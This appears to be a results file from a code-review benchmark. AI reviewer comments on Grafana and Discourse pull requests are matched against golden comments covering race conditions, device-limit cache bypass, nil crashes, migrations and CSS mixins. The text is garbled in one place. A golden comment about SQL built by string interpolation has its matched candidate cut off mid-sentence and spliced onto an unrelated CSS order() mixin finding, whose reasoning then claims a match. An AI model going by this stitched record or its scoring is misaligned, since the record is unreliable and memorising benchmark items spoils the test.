true_positives.reasoning: Both identify the missing required key prop on GrafanaRuleListItem rendered in a React list, leading to reconciliation issues when list ordering changes.

true_positives.golden_comment: RuleActionsButtons is invoked with only promRule, but SilenceGrafanaRuleDrawer inside RuleActionsButtons still depends on a Grafana Ruler rule being present, so for Grafana rules coming from list views the 'Silence notifications' menu entry (now driven by Grafana Prom abilities) will toggle showSilenceDrawer without ever rendering the drawer. This means clicking 'Silence notifications' for these rules has no visible effect, even when abilities indicate silencing is allowed.
true_positives.matched_candidate:
"Silence notifications" menu item is a no-op when only a Prometheus rule is available

The silence drawer is rendered only when `rulerRuleType.grafana.alertingRule(rule)` is true, where `rule` is the ruler rule. In the new list view only `promRule` is passed, so `rule` is undefined and `SilenceGrafanaRuleDrawer` is never mounted. Meanwhile `AlertRuleMenu` now derives the Silence ability from the Prometheus rule (`useGrafanaPromRuleAbilities`), so the "Silence notifications" item is shown (the new GrafanaGroupLoader test even asserts it exists). Clicking it sets `showSilenceDrawer` to true and nothing happens — a visible, clickable action with no effect and no feedback.
true_positives.reasoning: Both identify the same bug: list views pass only promRule to RuleActionsButtons, while the silence drawer requires a Grafana Ruler rule. The Prom-based abilities expose the menu action, but clicking it only toggles state without rendering the drawer.

false_positives.candidate:
Delete and Pause menu items can never render in the ruler-less list view

`AlertRuleMenu` now computes Grafana abilities from `promRule` (so Pause/Delete can be "allowed" without a ruler rule), but the rendering conditions were not updated: the Delete item is gated on `canDelete && rulerRule` (line 165) and the Pause item on `canPause && rulerRuleType.grafana.rule(rulerRule)` (line 123). In the new rule list (`GrafanaRuleListItem` -> `RuleActionsButtons.V2` with only `promRule`), `rulerRule` is always undefined, so users can no longer pause or delete a rule from the list view even when they have permission. Note the delete handler itself only needs the identifier (`showDeleteModal(identifier, groupIdentifier)`), so the gate is unnecessary. The new assertion `expect(menuItems.length).toBe(4)` in GrafanaGroupLoader.test.tsx bakes this regression into the tests, and the `ui.menuItems.delete` selector added there is never used.

Grafana-managed recording rules lose Pause/Export/Restore abilities in the Prometheus ability path

`useAllGrafanaPromRuleAbilities` uses `isAlertingRule = prometheusRuleType.grafana.alertingRule(rule)` as the gate for `ModifyExport`, `Pause`, `Restore` and `DeletePermanently` (lines 324-330). The ruler-based equivalent used `rulerRuleType.grafana.rule(rule)`, which includes Grafana recording rules. Since Grafana-managed recording rules can be paused and exported, routing the list view through this hook silently removes the Pause, Export, Restore and Delete-permanently actions for every Grafana recording rule. Only `Silence` legitimately requires an alerting rule.

skipToken path grants Duplicate ability for non-Grafana rules

`useGrafanaPromRuleAbilities(skipToken, ...)` calls `useAllGrafanaPromRuleAbilities(undefined)`, which does not short-circuit: with `rule === undefined`, `loading` is false so `MaybeSupported = AlwaysSupported`, `isPluginProvided` is false so `duplicateSupported = true`, and `Duplicate` becomes `[true, ctx.hasPermission(AlertingRuleCreate)]`. `AlertRuleMenu` ORs this with the ruler ability (`canDuplicate = ruler || grafana`), so for data-source (Mimir/Loki/Prometheus) rules — which always pass `skipToken` — the "Duplicate" item is shown to any user holding the Grafana `alert.rules:create` permission, even when the data source has no ruler or the user lacks external-write permission. The hook should return an all-false ability map when no rule is supplied.

Federated rule groups are no longer treated as immutable in the existing rule views

`useAllAlertRuleAbilities` previously computed `isFederated = isFederatedRuleGroup(rule.group)` from the `CombinedRule`, which disabled Update/Delete/Pause for Mimir federated rule groups. It now delegates to `useAllRulerRuleAbilities`, where `isFederated` is hardcoded to `false` (the `isFederatedRuleGroup` import was dropped). As a result, every consumer of `useAllAlertRuleAbilities` (RulesTable, rule details, etc.) will now offer Edit/Delete on federated rules, which the backend rejects. The group information is no longer plumbed into the hook, so this needs an explicit fix (or at least the group's `source_tenants` passed through) rather than a TODO.

Provisioned-rule protection in the new list view is untested and depends on a newly declared optional field

`provenance?: string` is added to `GrafanaPromRuleDTOBase` and `isProvisionedPromRule` / `GrafanaRuleListItem` (`isProvisioned: Boolean(provenance)`) now rely exclusively on it to mark Grafana rules as provisioned in the ruler-less list view. No mock, fixture or test sets `provenance` on a Prometheus rule (e.g. `rulerRuleToPromRule` in GrafanaGroupLoader.test.tsx omits it), and no test asserts that a provisioned rule hides Edit/Delete through this path. If the Grafana Prometheus rules endpoint does not return `provenance`, provisioned rules will silently become editable/deletable in the list, so this behaviour needs a test that pins it down.

Rule view link lost the returnTo parameter

The deleted `GrafanaRuleLoader` built the rule href as `createRelativeUrl('/alerting/grafana/${uid}/view', { returnTo })` using `createReturnTo()`. The replacement omits `returnTo`, so navigating from the rule list into a rule detail page no longer provides the "return to previous" target and the user loses the back-navigation affordance to their filtered list.

logWarning is emitted during render for every affected row

`getEditableIdentifier` is called directly in the component body and calls `logWarning('Unable to construct an editable rule identifier')` whenever neither a ruler rule nor a Grafana Prometheus rule is supplied. Because this runs on every render — and the rule list polls Prometheus every 20s, re-rendering all rows — a single unsupported row will emit the same warning repeatedly, spamming the analytics backend. Move the reporting into an effect (or dedupe it) so it fires once per occurrence.

Stale comment and variable name after removing ruler prefetching

The ruler prefetch (`alertRuleApi.util.prefetch('getGrafanaRulerGroup', ...)`) was removed, but the surrounding comment still says "This is not mandatory to preload ruler rules ... but doesn't need to wait for each group to be loaded" and the variable is still named `cacheAndRulerPreload`. Both now describe behaviour that no longer exists and will mislead future readers into thinking ruler data is still warmed up here.

Queries are now interpolated twice (ad hoc filters applied twice)

`runSplitQuery` now calls `datasource.applyTemplateVariables(query, request.scopedVars, request.filters)` on every target, but the sub-requests it builds (`{ ...request, targets }`) still carry the original `scopedVars`/`filters` and are executed through `datasource.runQuery()` -> `DataSourceWithBackend.query()`, which calls `applyTemplateVariables(q, request.scopedVars, request.filters)` again for each target. The result is that interpolation runs twice on the same query: (a) `addAdHocFilters` is applied a second time to an expression that already contains those matchers, so ad hoc/adhoc-variable label matchers end up duplicated in the LogQL sent to Loki (e.g. `{app="x", env="prod", env="prod"}`), and (b) `templateSrv.replace` is re-run over a string that already contains substituted variable values, so any value that itself contains `$name`/`${name}` is expanded a second time, silently changing the query. Either strip `scopedVars`/`filters` from the sub-request, or flag the request as already interpolated so the downstream call is skipped.

Shard splitting path interpolates each query three times

`runShardSplitQuery` interpolates the targets with `applyTemplateVariables(query, request.scopedVars, request.filters)`, then hands the resulting sub-request (which still contains `scopedVars` and `filters`) to `runSplitQuery`, which interpolates again (querySplitting.ts:299), and finally `datasource.runQuery` -> `DataSourceWithBackend.query` interpolates a third time. The new assertion `expect(datasource.applyTemplateVariables).toHaveBeenCalledTimes(5)` in shardQuerySplitting.test.ts confirms the repeated calls (1 up-front + 1 per sub-request). Beyond wasted work (each call re-parses the LogQL expression in `addAdHocFilters`), repeated application of ad hoc filters duplicates label matchers and repeated `templateSrv.replace` can re-expand `$`-containing variable values in the already-interpolated expression, including the injected `__stream_shard__` selector context. Interpolation should happen exactly once per query.

Assertion locks in redundant interpolation count

`expect(datasource.applyTemplateVariables).toHaveBeenCalledTimes(5)` asserts that a single target is interpolated five times (once in `runShardSplitQuery` plus once per shard sub-request inside `runSplitQuery`). This encodes the redundant re-interpolation as expected behaviour, so a future fix that interpolates only once will fail this test, and the test is coupled to the number of shard groups rather than to the thing being verified (that queries are interpolated before being run). Prefer asserting that the targets reaching `runQuery` are interpolated, or `toHaveBeenCalledTimes(1)` once the duplicate interpolation is removed. Note also that the mock mutates `query.expr` in place and is only correct because the substitution happens to be idempotent.

New test does not cover the actual regression (step used for partitioning)

The bug being fixed is that an un-interpolated `step` (e.g. `step: '$step'`) does not match the interval regex in `calculateStep`, so the metric time-range partitioning falls back to `intervalMs` and produces wrong split boundaries. The new test only asserts that `targets[0].expr`/`targets[0].step` on the first `runQuery` call are interpolated; it never asserts that the partitions/ranges (or the number of sub-requests) now reflect the interpolated step. The existing 'Correctly splits queries with step' test shows how range boundaries differ by step, so the fix could regress (e.g. interpolation moved back after partitioning) while this test still passes.

Test's replace mock ignores scopedVars, so `$__auto` substitution is unrealistic

The test's `replace: (input = '') => input.replace('$__auto', '5m')...` ignores the `scopedVars` argument. The real Loki `applyTemplateVariables` deliberately passes macros such as `$__auto`, `$__interval` and `$__range` through by overriding them in the scopedVars it hands to `templateSrv.replace`, so in production `count_over_time({a="b"}[$__auto])` is left untouched on the frontend and interpolated on the backend. The test therefore asserts a substitution that cannot happen in the real data source and gives false confidence about macro handling. Using a user-defined variable (e.g. `$range`/`$step`) would exercise the same code path realistically.

false_negatives.golden_comment: The applyTemplateVariables method is called with request.filters as the third parameter, but this parameter is not used in the corresponding test setup.

true_positives.golden_comment: Race condition: Multiple concurrent requests could pass the device count check simultaneously and create devices beyond the limit. Consider using a database transaction or lock.
true_positives.matched_candidate:
Count-then-insert is not atomic, so the device limit can be exceeded

`CreateOrUpdateDevice` first runs `CountDevices` and then, if under the limit, performs the upsert in a separate session. Concurrent requests from different new devices (very likely for anonymous traffic across multiple Grafana instances or goroutines) can all read a count below the limit and all insert, pushing the stored device count above `AnonymousDeviceLimit`. Enforcement needs to be atomic (e.g. insert guarded by a conditional statement/transaction with appropriate locking) if the limit is meant to be a hard cap.
true_positives.reasoning: Both identify the same race condition: concurrent requests can pass a non-atomic device count check and insert devices beyond the limit. Both recommend atomic enforcement through transactions or locking.

true_positives.golden_comment: The updateDevice function returns ErrDeviceLimitReached when rowsAffected == 0, but zero affected rows means the device doesn't exist or falls outside the time window, not that a limit was reached.
true_positives.matched_candidate:
Any zero-row UPDATE is reported as "device limit reached"

`updateDevice` returns `ErrDeviceLimitReached` whenever `RowsAffected() == 0`. That is true not only for unknown devices but also for a device row that exists yet whose `updated_at` falls outside the `[now-30d, now+1m]` window (rows are only purged after 61 days), and on MySQL for an update that changes no column values. The caller turns this into an authentication failure, so legitimate but stale devices are denied with a misleading error that makes the real cause impossible to diagnose from logs. Distinguish "row not matched" from "limit reached", or at minimum log the device id/reason.
true_positives.reasoning: Both identify the same bug: updateDevice incorrectly returns ErrDeviceLimitReached for zero affected rows, which can instead indicate a nonexistent device or one outside the update time window. The candidate adds details without changing the underlying issue.

true_positives.golden_comment: The `tagDeviceUI` function populates the local cache with the device ID before the `CreateOrUpdateDevice` call. If `ErrDeviceLimitReached` is returned, the cache entry remains set, allowing subsequent requests to bypass the device limit until the cache expires after 29 minutes.
true_positives.matched_candidate:
Device limit is bypassed after the first rejection because the cache is populated before the DB write

`tagDeviceUI` writes the device key into `localCache` (`a.localCache.SetDefault(key, struct{}{})`) *before* calling `anonStore.CreateOrUpdateDevice`. With the new limit enforcement, the first request from a device that exceeds the limit returns `ErrDeviceLimitReached` (and `Anonymous.Authenticate` rejects it), but the key is already cached. Every subsequent request from the same `X-Grafana-Device-Id` within the cache TTL (29 min) short-circuits at the cache check, returns nil, and the anonymous user is authenticated without ever being recorded. So the limit only blocks a single request per device per ~29 minutes and is trivially bypassed by a page reload. The cache entry should only be set after a successful store write (or removed on error).
true_positives.reasoning: Both identify the same bug: tagDeviceUI caches the device ID before CreateOrUpdateDevice succeeds, leaving the entry cached after ErrDeviceLimitReached and allowing subsequent requests to bypass the device limit for the 29-minute TTL.

false_positives.candidate:
Raw `ErrDeviceLimitReached` returned from Authenticate yields an opaque 500 to the user

`ErrDeviceLimitReached` is created with `fmt.Errorf("device limit reached")` in anonstore/database.go and is returned verbatim from `Anonymous.Authenticate`. The authn stack maps non-`errutil` client errors to a generic internal server error, so a user hitting the configured anonymous device limit gets a 500 with no actionable message instead of a well-defined 4xx/403 with a user-facing reason. Define the error with `errutil` (public message, proper status) so the rejection is reported correctly to the browser and logs.

Exported provider signatures changed without updating DI wiring / generated code

`ProvideAnonymousDeviceService` no longer takes `anonstore.AnonStore` but a `db.DB`, and `anonstore.ProvideAnonDBStore` gained a second `deviceLimit int64` parameter. These are the providers referenced by the checked-in wire graph (`pkg/server/wire.go` and the generated `wire_gen.go`), plus enterprise wiring. Neither file is part of this PR, so the generated code still calls the old signatures and the build will fail (and/or wire now has a stale `ProvideAnonDBStore` provider with no `int64` binding). Regenerate wire and update all callers. Note this also removes the ability to inject a fake `AnonStore` into the service, which reduces testability of `AnonDeviceService`.

New `[auth.anonymous] device_limit` option is undocumented

`cfg.AnonymousDeviceLimit` is read from `auth.anonymous.device_limit`, but the PR does not add the key to `conf/defaults.ini` / `conf/sample.ini` nor to docs/sources/setup-grafana/configure-grafana. Operators have no way to discover the option, its default (0 = unlimited), or the fact that exceeding it blocks anonymous authentication. Grafana convention requires every new ini setting to appear in defaults.ini and the configuration docs. Also consider rejecting/normalizing negative values, which are currently silently treated as "unlimited" by the `s.deviceLimit > 0` check.

Limit-enforcement tests do not cover the update path or the client behaviour

`TestIntegrationBeyondDeviceLimit` only asserts that a *new* device is rejected when the limit is reached. The core new logic — that an *existing* device is still updated successfully (and therefore still authenticates) once the limit is hit, including the `updated_at BETWEEN` window boundaries — is untested, as is the new synchronous `Anonymous.Authenticate` behaviour (returns error for `ErrDeviceLimitReached`, logs and continues for other errors) and the interaction with the local cache. Without those tests the limit-bypass via the local cache and the stale-row rejection path go unnoticed.

Device tagging moved into the synchronous auth path, adding a COUNT query per cache miss

The previous implementation tagged devices in a background goroutine with its own 2-minute timeout and panic recovery; tagging is now done inline on the request's context during `Authenticate`. For every cache miss (once per device per 29 min) an anonymous request now blocks on `SELECT COUNT(*) FROM anon_device WHERE updated_at BETWEEN ? AND ?` plus the upsert. `anon_device` has no index supporting a range scan on `updated_at`, so on instances with many anonymous devices this is a table scan in the request path, and any DB slowness/latency is now visible to the user instead of being absorbed asynchronously. Consider caching the count or indexing `updated_at`, and only performing the count when the limit is configured.

Backend sends 0 for "no limit" while the frontend type declares `number | undefined`

`AnonymousDeviceLimit int64` has no `omitempty`/pointer, so when no limit is configured the payload contains `anonymousDeviceLimit: 0`, yet `GrafanaConfig.anonymousDeviceLimit` is typed `number | undefined` and `GrafanaBootConfig` initialises it to `undefined`. Frontend code that distinguishes "unset" via `=== undefined` will treat an unlimited instance as having a limit of 0. Use `*int64` with `omitempty` (or document that 0 means unlimited) so the two sides agree.

false_negatives.golden_comment: Anonymous authentication now fails entirely if anonDeviceService.TagDevice returns ErrDeviceLimitReached. Previously, device tagging was asynchronous and non-blocking. This change prevents anonymous users from authenticating when the device limit is reached.

Time window calculation inconsistency: Using device.UpdatedAt.UTC().Add(-anonymousDeviceExpiration) as the lower bound but device.UpdatedAt as the current time may not match the intended logic. Consider using time.Now().UTC() consistently.

true_positives.golden_comment: The @loaded_locales instance variable in translate_accelerator.rb is lazily initialized and accessed by multiple concurrent threads without synchronization.
true_positives.matched_candidate:
`ensure_loaded!` initializes and reads @loaded_locales outside LOAD_MUTEX

`ensure_loaded!` does `@loaded_locales ||= []` and `@loaded_locales.include?(locale)` without holding `LOAD_MUTEX`, while `load_locale` appends to the same array under the mutex and `reload!` replaces it. Two request threads entering `ensure_loaded!` concurrently when `@loaded_locales` is nil can each create a separate array, so one thread's bookkeeping is discarded and locale files are parsed again (and, combined with `reload!`, a thread can observe a partially replaced list). The consequence is redundant, expensive YAML loading rather than corruption, but the initialization belongs inside the mutex (or `@loaded_locales` should be initialized eagerly at load time).
true_positives.reasoning: The candidate identifies the same unsynchronized lazy initialization and concurrent access to @loaded_locales, specifically noting initialization and reads outside LOAD_MUTEX.

false_positives.candidate:
Translation LRU cache key does not include the fallback chain (multisite cross-site leakage)

The memoized translation cache key is `"#{key}#{config.locale}#{config.backend.object_id}"`. With this PR the fallback chain is no longer a static `[locale, :en]`; it is `[locale, SiteSetting.default_locale.to_sym, :en]` (config/initializers/i18n.rb), i.e. it now depends on a per-site setting. Because the cache key does not contain `SiteSetting.default_locale`, a value resolved through the fallback chain on one site is served to every other site in the same process. Example: site A has `default_locale = de`, a user with locale `fr` triggers a lookup of a key missing in `fr`; the German string is resolved and cached under key `"...fr<backend_id>"`. A subsequent request on site B (`default_locale = en`) for the same key in `fr` gets a cache hit and is shown the German string. The same staleness occurs on a single site whenever an admin changes `default_locale` without an `I18n.reload!`/cache flush. Previously the chain fell back to the global `I18n.default_locale`, so the cache was site-independent and this could not happen.

Fallback locales are only loaded for web requests; missing translations get cached permanently

Because of the lazy-loading freedom patch, `I18n.translate` only calls `load_locale(config.locale)` for the *current* locale; translations for the other locales in the fallback chain are loaded exclusively by `FallbackLocaleList#ensure_loaded!`, which is only invoked from `ApplicationController#set_locale`. Any code path that is not an HTTP request through ApplicationController - Sidekiq jobs, mailers rendered from jobs, rake tasks, the console, `I18n.with_locale` blocks - will have an unloaded fallback locale, so `I18n::Backend::Fallbacks` finds nothing and the lookup resolves to the "translation missing" string instead of the site default/English text. Worse, `I18n.translate` caches that result in the LRU cache (`@cache.getset(k) { translate_no_cache(key).freeze }`) and `ensure_loaded!` does not clear the cache, so once a key is resolved while the fallback locale was unloaded, the "translation missing" text keeps being returned for web requests too until the entry is evicted or the process restarts. Loading should be hooked into `load_locale`/`translate` (or the cache invalidated when a new locale is loaded) rather than relying on a controller filter.

Fallback chain calls SiteSetting on every lookup and raises if default_locale is nil / DB unavailable

`FallbackLocaleList#[]` executes `SiteSetting.default_locale.to_sym` on every fallback resolution. Two concrete problems: (1) if `SiteSetting.default_locale` is nil or site settings are not usable yet, `nil.to_sym` raises `NoMethodError` from deep inside an `I18n.t` call - this happens in contexts where I18n is used but the database/site_settings are not available (e.g. `rake assets:precompile` on a machine without a DB, early boot, migrations), turning a harmless missing translation into a crash. The trailing `.compact` does not protect against this because `to_sym` is evaluated first; it only guards a nil `locale` argument. (2) `[]` is on the hot path of every missing-translation lookup and allocates a new array plus performs a site-setting read each time, even though `FallbackLocaleList` inherits from `Hash` and never memoizes (unlike `I18n::Locale::Fallbacks`, which caches the computed chain). Consider rescuing/guarding the setting lookup and memoizing per locale+default_locale.

No tests for the new fallback behaviour, which is now enabled in all environments

This PR moves fallbacks from `config.i18n.fallbacks = true` (previously only production/profile) to an initializer that is loaded in every environment, including test and development, and introduces a custom three-step chain (user locale -> site default -> :en) plus a new `I18n.ensure_loaded!`. No spec is added for any of it: there is no coverage that a key missing in the user locale resolves to the site default and then to English, that `FallbackLocaleList#ensure_loaded!` actually loads the locale files it returns, or that `I18n::Backend::Pluralization` is still applied after `config/initializers/pluralization.rb` was deleted. Since fallbacks now also apply in the test environment, existing specs that rely on missing-translation behaviour can silently change meaning without any new test asserting the intended semantics.

false_negatives.golden_comment: Consider normalizing the input locale (e.g., to a symbol) when checking/loading here to avoid double-loading if the same locale is passed as a String vs Symbol (also applies to other locations in the PR).

true_positives.golden_comment: The `TestLogger.FromContext` method returns a new `TestLogger` instance via `NewTestLogger()` instead of returning the receiver (f). This causes logs to be recorded on an un-referenced instance, leading to broken test assertions that expect logs to be recorded on the original logger.
true_positives.matched_candidate:
TestLogger.FromContext returns a fresh logger, discarding recorded logs

`TestLogger.FromContext` returns `NewTestLogger()` instead of the receiver, so the returned logger writes its `InfoLogs`/`DebugLogs`/... counters into a throwaway instance. Since `LoggerMiddleware.logRequest` now always goes through `m.logger.FromContext(ctx).Info("Plugin Request Completed", ...)`, any test that injects `plog.NewTestLogger()` into the middleware and then asserts on `logger.InfoLogs.Calls`/`Message`/`Ctx` will observe zero calls — either failing outright or, worse, silently passing assertions that expect nothing to be logged. The fake should return `f` (optionally recording the ctx) so logging through the contextual path remains observable.
true_positives.reasoning: Both identify the same bug: TestLogger.FromContext returns NewTestLogger() rather than the receiver, so logs are recorded on a separate instance and assertions against the original logger fail.

false_positives.candidate:
New ContextualLoggerMiddleware has no tests and the moved log fields are unverified

This PR moves the `pluginId`, `endpoint`, `dsName`, `dsUID` and `uname` fields out of the explicit log params in `LoggerMiddleware.logRequest` and into context attributes set by the brand-new `ContextualLoggerMiddleware`, but no test is added for the new middleware and no test asserts that the "Plugin Request Completed" log line still carries those fields. The correctness now depends on (a) the middleware being registered ahead of `LoggerMiddleware` in the chain and (b) `log.WithContextualAttributes` attributes being picked up by `Logger.FromContext`. A silent regression here would drop fields that log-based dashboards/alerts rely on, with nothing in CI to catch it.

Adding FromContext to the exported plugins/log.Logger interface is a breaking change

`plugins/log.Logger` is an exported interface consumed across the plugin packages and by out-of-tree code (e.g. grafana-enterprise). Adding the `FromContext(ctx context.Context) Logger` method breaks every existing implementation that is not updated in this PR; only the two in-tree implementations (`grafanaInfraLogWrapper` and `TestLogger`) were adjusted, and the `var _ Logger = ...` compile checks only cover those. Any external or generated implementation will fail to compile after this change, so it needs to be coordinated/announced or the method should be introduced via an optional extension interface.

FromContext silently drops contextual fields if the concrete type assertion fails

`grafanaInfraLogWrapper.FromContext` asserts the result of `d.l.FromContext(ctx)` to `*log.ConcreteLogger` and, on failure, falls back to `d.New()` — a logger with no context attributes at all. The failure path is silent: if `infra/log` ever returns a different `Logger` implementation from `FromContext`, every plugin request log line would silently lose `pluginId`, `endpoint`, `dsName`, `dsUID`, `uname` and `traceID`, with no error or warning to indicate why. Consider storing the `log.Logger` interface in the wrapper instead of the concrete `*ConcreteLogger`, so no assertion is needed.

Logger name still "plugin.instrumentation" after the rename

`NewLoggerMiddleware` is still constructed with `log.New("plugin.instrumentation")`, so the emitted log lines carry `logger=plugin.instrumentation` even though the instrumentation middleware has been renamed to the metrics middleware and the contextual logging has been split out. Since the goal of this change is naming consistency, and this name is user-visible in logs (and used for per-logger level configuration), it should be updated to something that matches the new structure (e.g. `plugin.logger`/`plugin.request`), keeping in mind that changing it affects existing log filters.

false_negatives.golden_comment: The ContextualLoggerMiddleware methods (QueryData, CallResource, CheckHealth, CollectMetrics) panic when a nil request is received. This occurs because they directly access req.PluginContext (via the instrumentContext function) without first checking if req is nil. This is a regression, as previous middleware layers gracefully handled nil requests.

The traceID is no longer logged for plugin requests. During a refactoring, the tracing import and the logic to extract and add traceID from the context to log parameters were removed from the LoggerMiddleware. The newly introduced ContextualLoggerMiddleware does not add this information, resulting in missing traceID in plugin request logs and impacting debugging and request tracing capabilities.

true_positives.golden_comment: The EmbeddableHost model's before_validation callback calls self.host.sub! to strip http://, https://, and path segments, but if self.host is nil, this raises NoMethodError.
true_positives.matched_candidate:
before_validation raises NoMethodError when host is nil

`self.host.sub!(...)` is executed unconditionally in `before_validation`. If `host` is nil — e.g. `Admin::EmbeddableHostsController#save_host` assigns `params[:embeddable_host][:host]` which may be missing — validation blows up with `NoMethodError: undefined method 'sub!' for nil`, returning a 500 instead of a validation error. Guard with `return if host.blank?` (and add a presence validation). Note also that `sub!` mutates the string in place, which mutates the caller's/params' string object; `sub` with assignment would be safer.
true_positives.reasoning: Both identify the same bug: the EmbeddableHost before_validation callback calls self.host.sub! without guarding against nil, causing NoMethodError. The candidate's additional mutation concern does not change this match.

true_positives.golden_comment: The update and destroy methods in Admin::EmbeddableHostsController do not validate the existence of the EmbeddableHost record retrieved by ID. If EmbeddableHost.where(id: params[:id]).first returns nil (i.e., the host does not exist), attempting to call methods on the nil object (e.g., save_host or destroy) will result in a NoMethodError.
true_positives.matched_candidate:
update/destroy crash with 500 when the id does not exist

`EmbeddableHost.where(id: params[:id]).first` can return nil. `update` then calls `save_host(nil)` which does `nil.host = ...` and `destroy` (line 16) calls `nil.destroy`; both raise `NoMethodError` and produce a 500 response. These endpoints should respond 404 (e.g. `find_by!`/`raise Discourse::NotFound`) for unknown ids.
true_positives.reasoning: Both identify missing existence checks for EmbeddableHost records in update and destroy, causing NoMethodError when the ID lookup returns nil.

true_positives.golden_comment: record_for_host compares lower(host) = ? but does not normalize the parameter’s case, so mixed‑case referer hosts may fail to match even though comparison intends to be case‑insensitive.
true_positives.matched_candidate:
Case-insensitive host lookup compares against a non-downcased value

`where("lower(host) = ?", host)` lowercases the column but not the argument. Host names in a `Referer` header are case-insensitive and browsers/servers may send mixed case (e.g. `http://EvilTrout.com/page`), in which case `lower(host) = 'EvilTrout.com'` never matches and a legitimately allowed host is rejected with `Discourse::InvalidAccess`. Pass `host.downcase`.
true_positives.reasoning: Both identify the same bug: the lookup lowercases the host column but not the parameter, causing mixed-case Referer hosts to fail an intended case-insensitive match.

true_positives.golden_comment: Because this migration inserts embeddable_hosts rows with raw SQL, any existing embeddable_hosts values that include http:// or /https:// or path segments won’t go through the EmbeddableHost model’s normalization, so the new host lookup (which compares only the bare host) may fail for migrated data. Consider ensuring that migrated hosts are normalized to the same format as newly created EmbeddableHost records so existing embedding configurations keep working.
true_positives.matched_candidate:
Migrated hosts are inserted unnormalized, so embedding silently stops working after upgrade

Host values are copied straight from the old `embeddable_hosts` site setting with raw SQL, bypassing `EmbeddableHost`'s `before_validation` which strips the scheme and path. The old setting legitimately contained values such as `http://discourse.org` and `https://example.com/1234` (see the removed specs in spec/models/site_setting_spec.rb). `EmbeddableHost.record_for_host` compares `URI(referer).host` (e.g. `discourse.org`) against the stored `host` column, so rows containing `http://discourse.org` will never match and previously-working embeds start raising `Discourse::InvalidAccess` after the upgrade. The migration must normalize each value (strip scheme/path) before inserting.
true_positives.reasoning: Both identify the same issue: raw SQL migration bypasses EmbeddableHost normalization, leaving schemes or paths in stored hosts that fail bare-host lookups and break existing embedding configurations.

true_positives.golden_comment: The contents of `category_fabricator.rb` and `embeddable_host_fabricator.rb` have been swapped, resulting in the loss of original category fabricators and potentially causing errors in fabricator usage.
true_positives.matched_candidate:
Fabricator file contents are swapped

`spec/fabricators/category_fabricator.rb` now contains only the `:embeddable_host` fabricator, while the new `spec/fabricators/embeddable_host_fabricator.rb` contains the `:category`, `:diff_category`, `:happy_category` and `:private_category` fabricators. The two file bodies were clearly pasted into the wrong files; this makes the fabricators undiscoverable by filename and will confuse anyone touching category fabrication.
true_positives.reasoning: Both identify the same underlying issue: the contents of category_fabricator.rb and embeddable_host_fabricator.rb were swapped, placing fabricators in the wrong files and potentially disrupting their usage.

true_positives.golden_comment: The SQL query in the `app/controllers/admin/embeddable_hosts_controller.rb` file uses string interpolation (`'#{h}'`) to insert values, which is vulnerable to SQL injection. It should use parameter binding or proper quoting to prevent this security vulnerability.
true_positives.matched_candidate:
Host value interpolated directly into INSERT statement

`execute "INSERT INTO embeddable_hosts (host, ...) VALUES ('#{h}', ...)"` interpolates a value taken from the database (the old `embeddable_hosts` setting, which was free-form admin input) into SQL without quoting. true_positives.matched_candidate:
order() mixin maps 0-based `order` onto 1-based legacy ordinal-group

The new `order($val)` mixin emits the same number for `-webkit-box-ordinal-group` / `-moz-box-ordinal-group` as for the standard `order` property. These are not equivalent: in the 2009 box spec `box-ordinal-group` is 1-based (initial value 1) while `order` is 0-based (initial value 0). Consequences: (a) `@include order(0)` emits `-webkit-box-ordinal-group: 0`, which is invalid and is dropped, and (b) any element given `order(1)` intending it to be placed *after* non-ordered siblings will instead be grouped with them in legacy-box engines, because unordered siblings default to ordinal-group 1. The legacy lines should use `$val + 1` (and the mixin should guard against `$val < 0`). This matters for the new usages `@include order(2)` on `.extra-info-wrapper` and `@include order(3)` on `.d-header .panel`, which only accidentally line up today because `.title` has no explicit order.
true_positives.reasoning: Both identify the same bug: the legacy -webkit-box-ordinal-group and -moz-box-ordinal-group properties require values starting at 1, so directly emitting $val = 0 produces invalid values and can cause layout issues in older browsers.

false_positives.candidate:
align-items() forwards modern keywords to legacy properties that do not accept them

`align-items($alignment)` passes `$alignment` verbatim to `-webkit-box-align` and `-ms-flex-align`. Those legacy properties only accept `start | end | center | baseline | stretch`, so the very common modern values `flex-start` and `flex-end` will produce invalid declarations that are silently dropped, leaving legacy engines (which are precisely the ones receiving `display: -webkit-box` / `-ms-flexbox` from the new `flexbox()` mixin) with the default `stretch` alignment. The current call sites only use `center` and `baseline`, so the bug is latent, but as a shared mixin it will break the first time someone writes `@include align-items(flex-start)`. The mixin should translate `flex-start`/`flex-end` to `start`/`end` for the legacy properties.

align-items() has no -moz-box-align although flexbox() emits display: -moz-box

`flexbox()` and `inline-flex()` emit `display: -moz-box` / `-moz-inline-box` for old Gecko, and `order()` emits `-moz-box-ordinal-group`, but `align-items()` omits `-moz-box-align`. Old Firefox versions therefore get legacy box layout with no cross-axis alignment at all (default stretch), which is exactly the case the prefix fallback was added for: e.g. `.d-header .contents` and `.small-action` will render with stretched, non-centered children instead of the intended vertical centering. Either add `-moz-box-align` or drop the `-moz-box` display fallbacks so the prefix coverage is internally consistent.

Making .small-action a flex container breaks right alignment of its button

`.small-action` is now `display: flex`, which makes `float` on its direct children a no-op. The `button { float: right; }` rule at the end of the block (and `.topic-avatar { float: left; }`) therefore no longer have any effect: the small-action button will be laid out immediately after `.small-action-desc` instead of being pushed to the right edge of the post, because `.small-action-desc` has no `flex: 1`/`flex-grow` and the button has no `margin-left: auto`. The existing `clear: both` on the flex container is likewise dead. Add `margin-left: auto` to the button (or `flex: 1` to `.small-action-desc`) and remove the now-meaningless float/clear declarations.

Header .panel right alignment relies on auto margins, which the legacy box fallback does not support

`.panel` previously used `float: right`; it now relies on `margin-left: auto` inside the flex `.contents`. Auto margins do not distribute free space in the 2009 flexbox (`display: -webkit-box` / `-moz-box`) that the new `flexbox()` mixin emits as a fallback, and there is no `-webkit-box-pack: end` equivalent. In engines that pick the legacy box display (old WebKit/Gecko builds) the panel with the search/user/hamburger icons will sit flush against the title instead of at the right edge of the header, i.e. a visible header regression for those browsers. Either add the legacy packing properties or drop the legacy `display` fallbacks so those browsers keep the float-based layout.

false_negatives.golden_comment: Mixing float: left with flexbox causes layout issues. Further this PR removes the float-based right alignment for .d-header .panel, which may cause the login panel in the non-Ember/noscript header (where .panel is nested inside .row and not a flex item) to stack under the title instead of remaining right-aligned.
-ms-align-items never existed in any version of IE/Edge; the correct legacy property is -ms-flex-align.

